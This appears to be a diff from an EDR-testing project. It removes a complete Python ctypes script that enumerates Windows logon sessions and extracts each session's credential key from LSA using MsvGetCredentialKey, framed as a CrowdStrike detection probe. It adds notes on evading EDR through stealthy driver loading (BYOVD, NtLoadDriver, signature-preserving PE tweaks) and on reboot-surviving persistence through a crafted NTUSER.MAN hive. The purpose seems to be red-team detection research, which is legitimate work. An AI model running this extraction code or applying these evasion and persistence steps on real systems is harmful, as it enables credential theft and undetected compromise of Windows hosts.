@@ -1,195 +1,39 @@
-"""
-lsa_gap_test.py
-Tests CrowdStrike detection of LSA credential key extraction.
-Works with standard Administrator — no SYSTEM/SeTcbPrivilege needed.
-Uses LsaConnectUntrusted instead of LsaRegisterLogonProcess.
+Inspiration :
+https://whiteknightlabs.com/2025/11/25/discreet-driver-loading-in-windows/
+Published on: November 25, 2025
+Hypothesis:
+Stealth driver loading techniques (non-standard paths/extensions, checksum-preserving signature tweaks, NtLoadDriver manual loads, BYOVD) can circumvent CrowdStrike behavioral rules and partial hash/signature blocks.
 
-RUN as Administrator:
-    python lsa_gap_test.py
-"""
+Part 2 shifts to the next problem: how do you actually get that driver loaded into the system without EDRs, antivirus, or Windows protections screaming alerts? That's what 'discreet' means here—stealthy integration so you can run malicious/vulnerable code at the deepest level without obvious traces.
+First, normal driver loading is pretty loud:
 
-import ctypes
-import ctypes.wintypes as wt
-import sys, os, datetime
+You drop a .sys file usually in C:\Windows\System32\drivers.
+Register it via the Service Control Manager (sc create/start, or an .inf installer).
+It needs a valid Microsoft-trusted signature.
+This triggers tons of telemetry: Sysmon Event ID 6 (ImageLoaded for drivers), process/service creation events, signature checks, etc.
+Modern defenses like the Vulnerable Driver Blocklist, Driver Signature Enforcement, or HVCI (Memory Integrity) will often block or flag it.
 
-LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "lsa_gap_results.txt")
-log = open(LOG_PATH, "w", encoding="utf-8")
+Attackers want to bypass that noise. The article covers several evasion tricks:
 
-def p(msg=""):
-    print(msg)
-    log.write(msg + "\n")
-    log.flush()
+Path and naming games — Put the driver in the expected System32\drivers folder so path-based rules don't flag it as weird. Or spoof the extension (load something named .exe as a driver, since the extension isn't strictly enforced).
+Service type tricks — Avoid the obvious "type= kernel" when creating the service; sometimes use "type= filesys" or other variants to look less suspicious.
+Signature manipulation for evasion — A cool technical bit: certain PE header fields like the Checksum or parts of the WIN_CERTIFICATE structure aren't included in the hash that Microsoft uses for signing validation. You can tweak those fields (e.g., with a hex editor or script) to change the file slightly—creating variants of the same vulnerable driver—without breaking the signature. This can dodge hash-based or simple signature rules in some EDRs. (Note: It won't fool Microsoft's Autentihash-based blocklist, though.)
+Bring Your Own Vulnerable Driver (BYOVD) — The big popular tactic: Instead of writing your own unsigned evil driver, just load a legitimate (but vulnerable) signed one that's already trusted—even if it's old or has known issues. Exploit its flaws once loaded to do kernel-level damage.
+Manual/low-level loading — Use APIs like NtLoadDriver directly (undocumented NT syscall) instead of sc.exe or standard loaders. This can sometimes be disguised as normal admin activity and avoids some SCM-related monitoring.
 
-NTSTATUS   = ctypes.c_long
-STATUS_OK  = 0
+Inspiration:
+https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/
+Published on : January 26, 2026
+Hypothesis: Mandatory User Profile abuse via NTUSER.MAN combined with Offline Registry API (Offreg.dll) hive manipulation can circumvent CrowdStrike behavioral detection by avoiding standard registry APIs, enabling persistent registry modifications that survive reboots without triggering monitored ETW or registry write telemetry.
 
-class LSA_STRING(ctypes.Structure):
-    _fields_ = [("Length", ctypes.c_ushort),
-                ("MaximumLength", ctypes.c_ushort),
-                ("Buffer", ctypes.c_char_p)]
+Step 1 — Get a copy of the registry
+The attacker grabs a snapshot of the current user registry. This is their raw material.
+Step 2 — Edit it quietly
+Using an obscure Windows tool (Offreg.dll) they edit the registry snapshot like a normal file — adding whatever malicious settings they want. No Windows APIs touched, so no alerts fire.
+Step 3 — Drop the file
+They save this modified registry snapshot as NTUSER.MAN in the user's folder. Just a simple file copy — nothing suspicious.
+Step 4 — Windows does the rest
+Next time the user logs in, Windows sees the .MAN file and loads it automatically. Windows itself applies all the attacker's changes — no malicious process running, no API calls, nothing to detect.
+Step 5 — It sticks forever
+Windows never overwrites .MAN files, so every single login loads the attacker's settings fresh. Permanent persistence with zero ongoing activity to detect.
 
-class LUID(ctypes.Structure):
-    _fields_ = [("LowPart", ctypes.c_ulong),
-                ("HighPart", ctypes.c_long)]
-
-class UNICODE_STRING(ctypes.Structure):
-    _fields_ = [("Length", ctypes.c_ushort),
-                ("MaximumLength", ctypes.c_ushort),
-                ("Buffer", ctypes.c_wchar_p)]
-
-class SESSION_DATA(ctypes.Structure):
-    _fields_ = [("Size", ctypes.c_ulong),
-                ("LogonId", LUID),
-                ("UserName", UNICODE_STRING),
-                ("LogonDomain", UNICODE_STRING),
-                ("AuthenticationPackage", UNICODE_STRING),
-                ("LogonType", ctypes.c_ulong),
-                ("Session", ctypes.c_ulong),
-                ("Sid", ctypes.c_void_p),
-                ("LogonTime", ctypes.c_int64),
-                ("LogonServer", UNICODE_STRING),
-                ("DnsDomainName", UNICODE_STRING),
-                ("Upn", UNICODE_STRING)]
-
-class CREDKEY_REQUEST(ctypes.Structure):
-    _fields_ = [("MessageType", ctypes.c_ulong),
-                ("LogonId", LUID)]
-
-class CREDKEY_RESPONSE(ctypes.Structure):
-    _fields_ = [("MessageType", ctypes.c_ulong),
-                ("KeyType", ctypes.c_ulong),
-                ("Key", ctypes.c_ubyte * 20)]
-
-# Load secur32
-sec = ctypes.WinDLL("secur32.dll")
-
-# LsaConnectUntrusted — works as normal Admin, no SeTcbPrivilege needed
-sec.LsaConnectUntrusted.restype  = NTSTATUS
-sec.LsaConnectUntrusted.argtypes = [ctypes.POINTER(wt.HANDLE)]
-
-sec.LsaLookupAuthenticationPackage.restype  = NTSTATUS
-sec.LsaLookupAuthenticationPackage.argtypes = [wt.HANDLE,
-    ctypes.POINTER(LSA_STRING), ctypes.POINTER(ctypes.c_ulong)]
-
-sec.LsaCallAuthenticationPackage.restype  = NTSTATUS
-sec.LsaCallAuthenticationPackage.argtypes = [wt.HANDLE, ctypes.c_ulong,
-    ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p),
-    ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(NTSTATUS)]
-
-sec.LsaFreeReturnBuffer.restype  = NTSTATUS
-sec.LsaFreeReturnBuffer.argtypes = [ctypes.c_void_p]
-
-sec.LsaEnumerateLogonSessions.restype  = NTSTATUS
-sec.LsaEnumerateLogonSessions.argtypes = [ctypes.POINTER(ctypes.c_ulong),
-    ctypes.POINTER(ctypes.POINTER(LUID))]
-
-sec.LsaGetLogonSessionData.restype  = NTSTATUS
-sec.LsaGetLogonSessionData.argtypes = [ctypes.POINTER(LUID),
-    ctypes.POINTER(ctypes.POINTER(SESSION_DATA))]
-
-sec.LsaDeregisterLogonProcess.restype  = NTSTATUS
-sec.LsaDeregisterLogonProcess.argtypes = [wt.HANDLE]
-
-def lsa_str(s):
-    b = s.encode("ascii")
-    ls = LSA_STRING(); ls.Buffer = b
-    ls.Length = len(b); ls.MaximumLength = len(b)+1
-    return ls
-
-def run_test(luid):
-    handle = wt.HANDLE()
-    pkg_id = ctypes.c_ulong(0)
-
-    # STEP 1 — LsaConnectUntrusted (untrusted client, works as Admin)
-    p("[*] STEP 1: LsaConnectUntrusted")
-    st = sec.LsaConnectUntrusted(ctypes.byref(handle))
-    if st != STATUS_OK:
-        p(f"    [-] FAILED: 0x{st & 0xFFFFFFFF:08X}")
-        return False
-    p(f"    [+] OK  handle=0x{handle.value:X}")
-
-    # STEP 2 — Resolve MSV1_0 package
-    p("[*] STEP 2: LsaLookupAuthenticationPackage (MSV1_0)")
-    n = lsa_str("MICROSOFT_AUTHENTICATION_PACKAGE_V1_0")
-    st = sec.LsaLookupAuthenticationPackage(handle, ctypes.byref(n), ctypes.byref(pkg_id))
-    if st != STATUS_OK:
-        p(f"    [-] FAILED: 0x{st & 0xFFFFFFFF:08X}")
-        sec.LsaDeregisterLogonProcess(handle)
-        return False
-    p(f"    [+] OK  package_id={pkg_id.value}")
-
-    # STEP 3 — MsvGetCredentialKey (0x37) — the LSAWhisper call
-    p("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37)")
-    p(f"    LUID: 0x{luid.HighPart:X}:0x{luid.LowPart:X}")
-
-    req = CREDKEY_REQUEST()
-    req.MessageType = 0x37
-    req.LogonId = luid
-
-    resp_ptr   = ctypes.c_void_p(0)
-    resp_len   = ctypes.c_ulong(0)
-    sub_status = NTSTATUS(0)
-
-    st = sec.LsaCallAuthenticationPackage(
-        handle, pkg_id.value,
-        ctypes.byref(req), ctypes.sizeof(req),
-        ctypes.byref(resp_ptr), ctypes.byref(resp_len),
-        ctypes.byref(sub_status))
-
-    if st != STATUS_OK:
-        p(f"    [-] Outer FAILED: 0x{st & 0xFFFFFFFF:08X}")
-    elif sub_status.value != STATUS_OK:
-        p(f"    [-] Inner FAILED: 0x{sub_status.value & 0xFFFFFFFF:08X} (session ended or access denied)")
-    elif resp_ptr.value:
-        resp = ctypes.cast(resp_ptr, ctypes.POINTER(CREDKEY_RESPONSE)).contents
-        key  = bytes(resp.Key).hex().upper()
-        p(f"    [+] OK  {resp_len.value} bytes")
-        p(f"")
-        p(f"    ╔══════════════════════════════════════╗")
-        p(f"    ║  CREDENTIAL KEY EXTRACTED            ║")
-        p(f"    ╠══════════════════════════════════════╣")
-        p(f"    ║  Key:     {key:<28} ║")
-        p(f"    ║  Type:    {resp.KeyType}  (1=Local  2=Domain)    ║")
-        p(f"    ╚══════════════════════════════════════╝")
-        sec.LsaFreeReturnBuffer(resp_ptr)
-
-    sec.LsaDeregisterLogonProcess(handle)
-    return st == STATUS_OK and sub_status.value == STATUS_OK
-
-def main():
-    p("=" * 50)
-    p("  LSA Gap Test — CrowdStrike Detection Probe")
-    p(f"  {datetime.datetime.now()}")
-    p("=" * 50)
-    p(f"[*] Results saved to: {LOG_PATH}")
-
-    count    = ctypes.c_ulong(0)
-    sessions = ctypes.POINTER(LUID)()
-    st = sec.LsaEnumerateLogonSessions(ctypes.byref(count), ctypes.byref(sessions))
-    if st != STATUS_OK:
-        p(f"[-] Enumerate failed: 0x{st&0xFFFFFFFF:08X}")
-        return
-
-    p(f"[*] Found {count.value} sessions\n")
-
-    for i in range(count.value):
-        data_ptr = ctypes.POINTER(SESSION_DATA)()
-        luid = sessions[i]
-        st = sec.LsaGetLogonSessionData(ctypes.byref(luid), ctypes.byref(data_ptr))
-        if st != STATUS_OK or not data_ptr:
-            continue
-        d = data_ptr.contents
-        if d.LogonType in (2, 3, 5):
-            user   = d.UserName.Buffer    or ""
-            domain = d.LogonDomain.Buffer or ""
-            p(f"─── Session {i+1}/{count.value}  LUID=0x{luid.LowPart:X}  Type={d.LogonType}  {domain}\\{user}")
-            run_test(luid)
-            p("")
-        sec.LsaFreeReturnBuffer(data_ptr)
-
-    sec.LsaFreeReturnBuffer(sessions)
-    p("\n[*] Done. Check lsa_gap_results.txt")
-    log.close()
-
-if __name__ == "__main__":
-    main()
